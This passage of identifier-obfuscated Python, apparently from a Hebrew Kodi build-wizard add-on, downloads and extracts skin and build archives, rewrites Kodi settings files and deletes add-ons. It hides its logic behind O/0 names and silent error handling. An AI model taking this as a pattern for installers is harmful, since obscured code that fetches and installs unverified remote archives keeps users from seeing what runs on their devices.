				O0OO0OOO00000000O ='%s-%s.zip'%(SKINID18 ,O000O00O00000OO00 [0 ])#line:4140
				OOO0OOOOO0O000000 =wiz .workingURL (SKIN18ZIPURL +O0OO0OOO00000000O )#line:4141
				if OOO0OOOOO0O000000 ==True :#line:4142
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:4143
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4144
					O0O00OOOO00O000O0 =os .path .join (PACKAGES ,O0OO0OOO00000000O )#line:4145
					try :os .remove (O0O00OOOO00O000O0 )#line:4146
					except :pass #line:4147
					downloader .download (SKIN18ZIPURL +O0OO0OOO00000000O ,O0O00OOOO00O000O0 ,DP )#line:4148
					extract .all (O0O00OOOO00O000O0 ,HOME ,DP )#line:4149
					try :#line:4150
						OO000O000OO00O000 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:4151
						O000O0000OOO0OO0O =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:4152
						os .rename (OO000O000OO00O000 ,O000O0000OOO0OO0O )#line:4153
					except :#line:4154
						pass #line:4155
					try :#line:4156
						O0O0O0OO0OOOO000O =open (os .path .join (ADDONS ,SKINID18 ,'addon.xml'),mode ='r');OOOOO00OOO000O0O0 =O0O0O0OO0OOOO000O .read ();O0O0O0OO0OOOO000O .close ()#line:4157
						O000000OO0OOOO000 =wiz .parseDOM (OOOOO00OOO000O0O0 ,'addon',ret ='name',attrs ={'id':SKINID18 })#line:4158
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,O000000OO0OOOO000 [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID18 ,'icon.png'))#line:4159
					except :#line:4160
						pass #line:4161
					if KODIV >=17 :wiz .addonDatabase (SKINID18 ,1 )#line:4162
					DP .close ()#line:4163
					xbmc .sleep (500 )#line:4164
					wiz .forceUpdate (True )#line:4165
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:4166
				else :#line:4167
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:4168
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%OOO0OOOOO0O000000 ,xbmc .LOGERROR )#line:4169
			else :#line:4170
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:4171
		else :#line:4172
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:4173
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:4174
def skinfix17 ():#line:4175
	if KODIV >=17 and KODIV <18 and os .path .exists (os .path .join (ADDONS ,SKINID17 )):#line:4176
		O0O000OO0O00O0O00 =wiz .workingURL (SKINID17DDONXML )#line:4177
		if O0O000OO0O00O0O00 ==True :#line:4178
			O00OO0000OO00O00O =wiz .parseDOM (wiz .openURL (SKINID17DDONXML ),'addon',ret ='version',attrs ={'id':SKINID17 })#line:4179
			if len (O00OO0000OO00O00O )>0 :#line:4180
				O0O0OOOOO00O0OOOO ='%s-%s.zip'%(SKINID17 ,O00OO0000OO00O00O [0 ])#line:4181
				O0OO000OOOO00O0O0 =wiz .workingURL (SKIN17ZIPURL +O0O0OOOOO00O0OOOO )#line:4182
				if O0OO000OOOO00O0O0 ==True :#line:4183
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:4184
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4185
					O000OOOO0OOO00OOO =os .path .join (PACKAGES ,O0O0OOOOO00O0OOOO )#line:4186
					try :os .remove (O000OOOO0OOO00OOO )#line:4187
					except :pass #line:4188
					downloader .download (SKIN17ZIPURL +O0O0OOOOO00O0OOOO ,O000OOOO0OOO00OOO ,DP )#line:4189
					extract .all (O000OOOO0OOO00OOO ,HOME ,DP )#line:4190
					try :#line:4191
						O0OOO00OOO0OO000O =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:4192
						OOO0OOOOO0O0OO0O0 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:4193
						os .rename (O0OOO00OOO0OO000O ,OOO0OOOOO0O0OO0O0 )#line:4194
					except :#line:4195
						pass #line:4196
					try :#line:4197
						OO0000O0O0O00000O =open (os .path .join (ADDONS ,SKINID17 ,'addon.xml'),mode ='r');O0OO000OOO0000OO0 =OO0000O0O0O00000O .read ();OO0000O0O0O00000O .close ()#line:4198
						OO0O00O00OOO000O0 =wiz .parseDOM (O0OO000OOO0000OO0 ,'addon',ret ='name',attrs ={'id':SKINID17 })#line:4199
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0O00O00OOO000O0 [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID17 ,'icon.png'))#line:4200
					except :#line:4201
						pass #line:4202
					if KODIV >=17 :wiz .addonDatabase (SKINID17 ,1 )#line:4203
					DP .close ()#line:4204
					xbmc .sleep (500 )#line:4205
					wiz .forceUpdate (True )#line:4206
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:4207
				else :#line:4208
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:4209
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%O0OO000OOOO00O0O0 ,xbmc .LOGERROR )#line:4210
			else :#line:4211
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:4212
		else :#line:4213
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:4214
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:4215
def fix17update ():#line:4216
	if KODIV >=17 and KODIV <18 :#line:4217
		wiz .kodi17Fix ()#line:4218
		xbmc .sleep (4000 )#line:4219
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:4220
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:4221
		fixfont ()#line:4222
		OO0OO0O0O0OO00000 =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:4223
		try :#line:4225
			OOO0O00OO00O0O000 =open (OO0OO0O0O0OO00000 ,'r')#line:4226
			OO0O0000000O0O0O0 =OOO0O00OO00O0O000 .read ()#line:4227
			OOO0O00OO00O0O000 .close ()#line:4228
			OO0O00000OO0O00O0 ='<import addon="xbmc.gui" version="5.14.0(.+?)/>'#line:4229
			OOOO0O00000OO0O0O =re .compile (OO0O00000OO0O00O0 ).findall (OO0O0000000O0O0O0 )[0 ]#line:4230
			OOO0O00OO00O0O000 =open (OO0OO0O0O0OO00000 ,'w')#line:4231
			OOO0O00OO00O0O000 .write (OO0O0000000O0O0O0 .replace ('<import addon="xbmc.gui" version="5.14.0%s/>'%OOOO0O00000OO0O0O ,'<import addon="xbmc.gui" version="5.12.0"/>'))#line:4232
			OOO0O00OO00O0O000 .close ()#line:4233
		except :#line:4234
				pass #line:4235
		wiz .kodi17Fix ()#line:4236
		OO0OO0O0O0OO00000 =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:4237
		try :#line:4238
			OOO0O00OO00O0O000 =open (OO0OO0O0O0OO00000 ,'r')#line:4239
			OO0O0000000O0O0O0 =OOO0O00OO00O0O000 .read ()#line:4240
			OOO0O00OO00O0O000 .close ()#line:4241
			OO0O00000OO0O00O0 ='<keyboardlayouts default="true(.+?)/keyboardlayouts>'#line:4242
			OOOO0O00000OO0O0O =re .compile (OO0O00000OO0O00O0 ).findall (OO0O0000000O0O0O0 )[0 ]#line:4243
			OOO0O00OO00O0O000 =open (OO0OO0O0O0OO00000 ,'w')#line:4244
			OOO0O00OO00O0O000 .write (OO0O0000000O0O0O0 .replace ('<keyboardlayouts default="true%s/keyboardlayouts>'%OOOO0O00000OO0O0O ,'<keyboardlayouts>English QWERTY|Hebrew QWERTY</keyboardlayouts>'))#line:4245
			OOO0O00OO00O0O000 .close ()#line:4246
		except :#line:4247
				pass #line:4248
		swapSkins ('skin.Premium.mod')#line:4249
def fix18update ():#line:4251
	if KODIV >=18 :#line:4252
		xbmc .sleep (4000 )#line:4253
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:4254
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:4255
		fixfont ()#line:4256
		OOOO0000000OOO00O =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:4257
		try :#line:4258
			O0OOOO0OO000OOO0O =open (OOOO0000000OOO00O ,'r')#line:4259
			O0O000OOO00OO0OO0 =O0OOOO0OO000OOO0O .read ()#line:4260
			O0OOOO0OO000OOO0O .close ()#line:4261
			O0O0O00OO0OOO0000 ='<import addon="xbmc.gui" version="5.12.0(.+?)/>'#line:4262
			O0O0000O0O0OO00O0 =re .compile (O0O0O00OO0OOO0000 ).findall (O0O000OOO00OO0OO0 )[0 ]#line:4263
			O0OOOO0OO000OOO0O =open (OOOO0000000OOO00O ,'w')#line:4264
			O0OOOO0OO000OOO0O .write (O0O000OOO00OO0OO0 .replace ('<import addon="xbmc.gui" version="5.12.0%s/>'%O0O0000O0O0OO00O0 ,'<import addon="xbmc.gui" version="5.14.0"/>'))#line:4265
			O0OOOO0OO000OOO0O .close ()#line:4266
		except :#line:4267
				pass #line:4268
		wiz .kodi17Fix ()#line:4269
		OOOO0000000OOO00O =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:4270
		try :#line:4271
			O0OOOO0OO000OOO0O =open (OOOO0000000OOO00O ,'r')#line:4272
			O0O000OOO00OO0OO0 =O0OOOO0OO000OOO0O .read ()#line:4273
			O0OOOO0OO000OOO0O .close ()#line:4274
			O0O0O00OO0OOO0000 ='<setting id="locale.keyboardlayouts" default="true(.+?)/setting>'#line:4275
			O0O0000O0O0OO00O0 =re .compile (O0O0O00OO0OOO0000 ).findall (O0O000OOO00OO0OO0 )[0 ]#line:4276
			O0OOOO0OO000OOO0O =open (OOOO0000000OOO00O ,'w')#line:4277
			O0OOOO0OO000OOO0O .write (O0O000OOO00OO0OO0 .replace ('<setting id="locale.keyboardlayouts" default="true%s/setting>'%O0O0000O0O0OO00O0 ,'<setting id="locale.keyboardlayouts">English QWERTY|Hebrew QWERTY</setting>'))#line:4278
			O0OOOO0OO000OOO0O .close ()#line:4279
		except :#line:4280
				pass #line:4281
		swapSkins ('skin.Premium.mod')#line:4282
def buildWizard (OOOO0OOO0OO0OO000 ,OO000OOOO0O0OOO0O ,theme =None ,over =False ):#line:4285
	O0OO00O0OO0O00O00 =xbmcgui .DialogBusy ()#line:4286
	O0OO00O0OO0O00O00 .create ()#line:4287
	if over ==False :#line:4288
		O0O00OO00OO000O0O =wiz .checkBuild (OOOO0OOO0OO0OO000 ,'url')#line:4289
		if USERNAME =='':#line:4290
			ADDON .openSettings ()#line:4291
			sys .exit ()#line:4292
		if PASSWORD =='':#line:4293
			ADDON .openSettings ()#line:4294
			sys .exit ()#line:4295
		if BUILDNAME =='':#line:4297
			O000OO00OO0O0OOOO =u_list (SPEEDFILE )#line:4298
			(O000OO00OO0O0OOOO )#line:4299
		if O0O00OO00OO000O0O ==False :#line:4300
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]אנא המתן...[/COLOR]'%COLOR2 )#line:4305
			xbmc .executebuiltin ("RunPlugin(plugin://plugin.program.Anonymous/?mode=install&name=+Kodi+Premium&url=gui)")#line:4306
			return #line:4307
		O0OOOOOO0OOO0OO0O =wiz .workingURL (O0O00OO00OO000O0O )#line:4308
		if O0OOOOOO0OOO0OO0O ==False :#line:4309
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Build Zip Error: %s[/COLOR]"%(COLOR2 ,O0OOOOOO0OOO0OO0O ))#line:4310
			return #line:4311
	if OO000OOOO0O0OOO0O =='gui':#line:4312
		if OOOO0OOO0OO0OO000 ==BUILDNAME :#line:4313
			if over ==True :O000OO0OOOOOO0O00 =1 #line:4314
			else :O000OO0OOOOOO0O00 =1 #line:4315
		else :#line:4316
			O000OO0OOOOOO0O00 =1 #line:4317
		if O000OO0OOOOOO0O00 :#line:4318
			remove_addons ()#line:4319
			remove_addons2 ()#line:4320
			debridit .debridIt ('update','all')#line:4321
			traktit .traktIt ('update','all')#line:4322
			OO000O000O0000O00 =wiz .checkBuild (OOOO0OOO0OO0OO000 ,'gui')#line:4323
			OOO0O0OOOO0OO000O =OOOO0OOO0OO0OO000 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4324
			if not wiz .workingURL (OO000O000O0000O00 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:4325
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4326
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOO0OOO0OO0OO000 ),'','אנא המתן')#line:4327
			OOO0OO0O0OO000000 =os .path .join (PACKAGES ,'%s_guisettings.zip'%OOO0O0OOOO0OO000O )#line:4328
			try :os .remove (OOO0OO0O0OO000000 )#line:4329
			except :pass #line:4330
			logging .warning (OO000O000O0000O00 )#line:4331
			if 'google'in OO000O000O0000O00 :#line:4332
			   O000OOO000O0OOOOO =googledrive_download (OO000O000O0000O00 ,OOO0OO0O0OO000000 ,DP ,wiz .checkBuild (OOOO0OOO0OO0OO000 ,'filesize'))#line:4333
			else :#line:4336
			  downloader .download (OO000O000O0000O00 ,OOO0OO0O0OO000000 ,DP )#line:4337
			xbmc .sleep (100 )#line:4338
			O0O000O00OO0O0000 ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOO0OOO0OO0OO000 )#line:4339
			DP .update (0 ,O0O000O00OO0O0000 ,'','אנא המתן')#line:4340
			extract .all (OOO0OO0O0OO000000 ,HOME ,DP ,title =O0O000O00OO0O0000 )#line:4341
			DP .close ()#line:4342
			wiz .defaultSkin ()#line:4343
			wiz .lookandFeelData ('save')#line:4344
			try :#line:4345
				telemedia_android5fix ()#line:4346
			except :pass #line:4347
			wiz .kodi17Fix ()#line:4348
			if KODIV >=18 :#line:4349
				skindialogsettind18 ()#line:4350
			debridit .debridIt ('restore','all')#line:4351
			traktit .traktIt ('restore','all')#line:4352
			if INSTALLMETHOD ==1 :OOOOO00OO0000O00O =1 #line:4354
			elif INSTALLMETHOD ==2 :OOOOO00OO0000O00O =0 #line:4355
			else :DP .close ()#line:4356
			OOO00OOOO000OO0OO =(NOTIFICATION2 )#line:4357
			OOO00OO0O000OO00O =urllib2 .urlopen (OOO00OOOO000OO0OO )#line:4358
			O0O000OO0O0O00OOO =OOO00OO0O000OO00O .readlines ()#line:4359
			O00O0OOO0OOOOOO0O =0 #line:4360
			for OO0O0O0OOO0O0OOO0 in O0O000OO0O0O00OOO :#line:4363
				if OO0O0O0OOO0O0OOO0 .split (' ==')[0 ]=="noreset"or OO0O0O0OOO0O0OOO0 .split ()[0 ]=="noreset":#line:4364
					xbmc .executebuiltin ("ReloadSkin()")#line:4366
					wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הבילד עודכן בהצלחה![/COLOR]'%COLOR2 )#line:4367
					update_Votes ()#line:4368
					indicatorfastupdate ()#line:4369
				if OO0O0O0OOO0O0OOO0 .split (' ==')[0 ]=="reset"or OO0O0O0OOO0O0OOO0 .split ()[0 ]=="reset":#line:4370
					update_Votes ()#line:4372
					indicatorfastupdate ()#line:4373
					resetkodi ()#line:4374
		else :#line:4383
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:4384
	if OO000OOOO0O0OOO0O =='gui2':#line:4385
		if OOOO0OOO0OO0OO000 ==BUILDNAME :#line:4386
			if over ==True :O000OO0OOOOOO0O00 =1 #line:4387
			else :O000OO0OOOOOO0O00 =1 #line:4388
		else :#line:4389
			O000OO0OOOOOO0O00 =1 #line:4390
		if O000OO0OOOOOO0O00 :#line:4391
			remove_addons ()#line:4392
			remove_addons2 ()#line:4393
			OO000O000O0000O00 =wiz .checkBuild (OOOO0OOO0OO0OO000 ,'gui')#line:4394
			OOO0O0OOOO0OO000O =OOOO0OOO0OO0OO000 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4395
			if not wiz .workingURL (OO000O000O0000O00 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:4396
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4397
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOO0OOO0OO0OO000 ),'','אנא המתן')#line:4398
			OOO0OO0O0OO000000 =os .path .join (PACKAGES ,'%s_guisettings.zip'%OOO0O0OOOO0OO000O )#line:4399
			try :os .remove (OOO0OO0O0OO000000 )#line:4400
			except :pass #line:4401
			logging .warning (OO000O000O0000O00 )#line:4402
			if 'google'in OO000O000O0000O00 :#line:4403
			   O000OOO000O0OOOOO =googledrive_download (OO000O000O0000O00 ,OOO0OO0O0OO000000 ,DP ,wiz .checkBuild (OOOO0OOO0OO0OO000 ,'filesize'))#line:4404
			else :#line:4407
			  downloader .download (OO000O000O0000O00 ,OOO0OO0O0OO000000 ,DP )#line:4408
			xbmc .sleep (100 )#line:4409
			O0O000O00OO0O0000 ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOO0OOO0OO0OO000 )#line:4410
			DP .update (0 ,O0O000O00OO0O0000 ,'','אנא המתן')#line:4411
			extract .all (OOO0OO0O0OO000000 ,HOME ,DP ,title =O0O000O00OO0O0000 )#line:4412
			DP .close ()#line:4413
			wiz .defaultSkin ()#line:4414
			wiz .lookandFeelData ('save')#line:4415
			if INSTALLMETHOD ==1 :OOOOO00OO0000O00O =1 #line:4418
			elif INSTALLMETHOD ==2 :OOOOO00OO0000O00O =0 #line:4419
			else :DP .close ()#line:4420
		else :#line:4422
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:4423
	elif OO000OOOO0O0OOO0O =='fresh':#line:4424
		freshStart (OOOO0OOO0OO0OO000 )#line:4425
	elif OO000OOOO0O0OOO0O =='normal':#line:4426
		if url =='normal':#line:4427
			if KEEPTRAKT =='true':#line:4428
				traktit .autoUpdate ('all')#line:4429
				wiz .setS ('traktlastsave',str (THREEDAYS ))#line:4430
			if KEEPREAL =='true':#line:4431
				debridit .autoUpdate ('all')#line:4432
				wiz .setS ('debridlastsave',str (THREEDAYS ))#line:4433
			if KEEPLOGIN =='true':#line:4434
				loginit .autoUpdate ('all')#line:4435
				wiz .setS ('loginlastsave',str (THREEDAYS ))#line:4436
		OO0OOOO00O0O0OOOO =int (KODIV );OO0OO0O000O00OOOO =int (float (wiz .checkBuild (OOOO0OOO0OO0OO000 ,'kodi')))#line:4437
		if not OO0OOOO00O0O0OOOO ==OO0OO0O000O00OOOO :#line:4438
			if OO0OOOO00O0O0OOOO ==16 and OO0OO0O000O00OOOO <=15 :OOOO00O000O00O0O0 =False #line:4439
			else :OOOO00O000O00O0O0 =True #line:4440
		else :OOOO00O000O00O0O0 =False #line:4441
		if OOOO00O000O00O0O0 ==True :#line:4442
			O0O0OOOO0O000O0O0 =1 #line:4443
		else :#line:4444
			if not over ==False :O0O0OOOO0O000O0O0 =1 #line:4445
			else :O0O0OOOO0O000O0O0 =DIALOG .yesno (ADDONTITLE ,'התקנה רגילה:','מצב זה שומר הרחבות קיימות, האם להמשיך?',nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4446
		if O0O0OOOO0O000O0O0 :#line:4447
			wiz .clearS ('build')#line:4448
			OO000O000O0000O00 =wiz .checkBuild (OOOO0OOO0OO0OO000 ,'url')#line:4449
			OOO0O0OOOO0OO000O =OOOO0OOO0OO0OO000 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4450
			if not wiz .workingURL (OO000O000O0000O00 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Build Install: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:4451
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4452
			DP .create (ADDONTITLE ,'[COLOR %s][B][/B][/COLOR] [COLOR %s]%s v%s[/COLOR][B]מוריד[/B]'%(COLOR2 ,COLOR1 ,OOOO0OOO0OO0OO000 ,wiz .checkBuild (OOOO0OOO0OO0OO000 ,'version')),'','אנא המתן')#line:4453
			OOO0OO0O0OO000000 =os .path .join (PACKAGES ,'%s.zip'%OOO0O0OOOO0OO000O )#line:4454
			try :os .remove (OOO0OO0O0OO000000 )#line:4455
			except :pass #line:4456
			logging .warning (OO000O000O0000O00 )#line:4457
			if 'google'in OO000O000O0000O00 :#line:4458
			   O000OOO000O0OOOOO =googledrive_download (OO000O000O0000O00 ,OOO0OO0O0OO000000 ,DP ,wiz .checkBuild (OOOO0OOO0OO0OO000 ,'filesize'))#line:4459
			else :#line:4462
			  downloader .download (OO000O000O0000O00 ,OOO0OO0O0OO000000 ,DP )#line:4463
			xbmc .sleep (1000 )#line:4464
			O0O000O00OO0O0000 ='[COLOR %s][B][/B][/COLOR] [COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOO0OOO0OO0OO000 ,wiz .checkBuild (OOOO0OOO0OO0OO000 ,'version'))#line:4465
			DP .update (0 ,O0O000O00OO0O0000 ,'','אנא המתן...')#line:4466
			O0OO0OO0OO000OOOO ,OO0OOOOO00O0OO000 ,OO0O00O00OO000OO0 =extract .all (OOO0OO0O0OO000000 ,HOME ,DP ,title =O0O000O00OO0O0000 )#line:4467
			if int (float (O0OO0OO0OO000OOOO ))>0 :#line:4468
				try :#line:4469
					wiz .fixmetas ()#line:4470
				except :pass #line:4471
				wiz .lookandFeelData ('save')#line:4472
				wiz .defaultSkin ()#line:4473
				wiz .setS ('buildname',OOOO0OOO0OO0OO000 )#line:4475
				wiz .setS ('buildversion',wiz .checkBuild (OOOO0OOO0OO0OO000 ,'version'))#line:4476
				wiz .setS ('buildtheme','')#line:4477
				wiz .setS ('latestversion',wiz .checkBuild (OOOO0OOO0OO0OO000 ,'version'))#line:4478
				wiz .setS ('lastbuildcheck',str (NEXTCHECK ))#line:4479
				wiz .setS ('installed','true')#line:4480
				wiz .setS ('extract',str (O0OO0OO0OO000OOOO ))#line:4481
				wiz .setS ('errors',str (OO0OOOOO00O0OO000 ))#line:4482
				wiz .log ('INSTALLED %s: [ERRORS:%s]'%(O0OO0OO0OO000OOOO ,OO0OOOOO00O0OO000 ))#line:4483
				fastupdatefirstbuild (NOTEID )#line:4484
				try :#line:4485
					telemedia_android5fix ()#line:4486
				except :pass #line:4487
				wiz .kodi17Fix ()#line:4488
				skin_homeselect ()#line:4489
				kodi17to18 ()#line:4495
				try :os .remove (OOO0OO0O0OO000000 )#line:4497
				except :pass #line:4498
				DP .close ()#line:4518
				OO00OO00O00OO0O0O =wiz .themeCount (OOOO0OOO0OO0OO000 )#line:4519
				builde_Votes ()#line:4520
				indicator ()#line:4521
				if not OO00OO00O00OO0O0O ==False :#line:4522
					buildWizard (OOOO0OOO0OO0OO000 ,'theme')#line:4523
				if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:4524
				if INSTALLMETHOD ==1 :OOOOO00OO0000O00O =1 #line:4525
				elif INSTALLMETHOD ==2 :OOOOO00OO0000O00O =0 #line:4526
				else :resetkodi ()#line:4527
				if OOOOO00OO0000O00O ==1 :wiz .reloadFix ()#line:4529
				else :wiz .killxbmc (True )#line:4530
			else :#line:4531
				if isinstance (OO0OOOOO00O0OO000 ,unicode ):#line:4532
					OO0O00O00OO000OO0 =OO0O00O00OO000OO0 .encode ('utf-8')#line:4533
				O0O00O00O0OOOOOO0 =open (OOO0OO0O0OO000000 ,'r')#line:4534
				OOOO0000000OO0OO0 =O0O00O00O0OOOOOO0 .read ()#line:4535
				OO00O0O0OOO0O0O00 =''#line:4536
				for OOOOOOO0000OO00O0 in O000OOO000O0OOOOO :#line:4537
				  OO00O0O0OOO0O0O00 ='key: '+OO00O0O0OOO0O0O00 +'\n'+OOOOOOO0000OO00O0 #line:4538
				wiz .TextBox ("%s: בעיה בהתקנת הבילד"%ADDONTITLE ,OO0O00O00OO000OO0 +'לפתרון הבעיה יש לשנות את התאריך במכשיר ליום אחד קודם.'+OO00O0O0OOO0O0O00 )#line:4539
		else :#line:4540
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנת הבילד: מבוטלת![/COLOR]'%COLOR2 )#line:4541
	elif OO000OOOO0O0OOO0O =='theme':#line:4542
		if theme ==None :#line:4543
			OO00OO00O00OO0O0O =wiz .checkBuild (OOOO0OOO0OO0OO000 ,'theme')#line:4544
			OO000OOO0O0OO000O =[]#line:4545
			if not OO00OO00O00OO0O0O =='http://'and wiz .workingURL (OO00OO00O00OO0O0O )==True :#line:4546
				OO000OOO0O0OO000O =wiz .themeCount (OOOO0OOO0OO0OO000 ,False )#line:4547
				if len (OO000OOO0O0OO000O )>0 :#line:4548
					if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]The Build [COLOR %s]%s[/COLOR] comes with [COLOR %s]%s[/COLOR] different themes"%(COLOR2 ,COLOR1 ,OOOO0OOO0OO0OO000 ,COLOR1 ,len (OO000OOO0O0OO000O )),"Would you like to install one now?[/COLOR]",yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]"):#line:4549
						wiz .log ("Theme List: %s "%str (OO000OOO0O0OO000O ))#line:4550
						OOOO0O0OO0OOO00OO =DIALOG .select (ADDONTITLE ,OO000OOO0O0OO000O )#line:4551
						wiz .log ("Theme install selected: %s"%OOOO0O0OO0OOO00OO )#line:4552
						if not OOOO0O0OO0OOO00OO ==-1 :theme =OO000OOO0O0OO000O [OOOO0O0OO0OOO00OO ];OO0OOO0O0O000OO00 =True #line:4553
						else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:4554
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:4555
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: None Found![/COLOR]'%COLOR2 )#line:4556
		else :OO0OOO0O0O000OO00 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to install the theme:'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,theme ),'for [COLOR %s]%s v%s[/COLOR]?[/COLOR]'%(COLOR1 ,OOOO0OOO0OO0OO000 ,wiz .checkBuild (OOOO0OOO0OO0OO000 ,'version')),yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]")#line:4557
		if OO0OOO0O0O000OO00 :#line:4558
			O0O0O00O0O00OO0O0 =wiz .checkTheme (OOOO0OOO0OO0OO000 ,theme ,'url')#line:4559
			OOO0O0OOOO0OO000O =OOOO0OOO0OO0OO000 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4560
			if not wiz .workingURL (O0O0O00O0O00OO0O0 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Invalid Zip Url![/COLOR]'%COLOR2 );return False #line:4561
